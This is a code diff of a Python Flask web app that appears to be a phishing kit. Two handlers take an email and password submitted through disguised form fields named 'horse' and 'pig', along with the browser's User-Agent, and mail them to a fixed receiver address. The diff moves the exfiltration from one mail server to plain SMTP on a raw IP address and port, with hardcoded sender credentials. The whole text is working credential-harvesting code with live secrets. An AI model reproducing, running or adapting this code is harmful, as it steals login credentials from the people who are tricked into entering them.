@@ -76,9 +76,10 @@ def first():
 
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "log@guide-level.com"
+        sender_email = "auto528@ecofuture.bio"
+        sender_emaill = "auto528"
         receiver_email = "miriam.adelson@clubmember.org"
-        password = "!p&4Ke_@M2HR"
+        password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
 
         message = MIMEMultipart("alternative")
@@ -100,8 +101,8 @@ def first():
         message.attach(part1)
         message.attach(part2)
 
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
-            server.login(sender_email, password)
+        with smtplib.SMTP("62.106.66.84", 6040) as server:
+            server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
 
         return redirect(url_for('benza', web=session.get('eman')))
@@ -115,9 +116,10 @@ def second():
 
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "log@guide-level.com"
+        sender_email = "auto528@ecofuture.bio"
+        sender_emaill = "auto528"
         receiver_email = "miriam.adelson@clubmember.org"
-        password = "!p&4Ke_@M2HR"
+        password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
 
         message = MIMEMultipart("alternative")
@@ -139,8 +141,8 @@ def second():
         message.attach(part1)
         message.attach(part2)
 
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
-            server.login(sender_email, password)
+        with smtplib.SMTP("62.106.66.84", 6040) as server:
+            server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
 
         return redirect(url_for('lasmo', web=session.get('eman')))
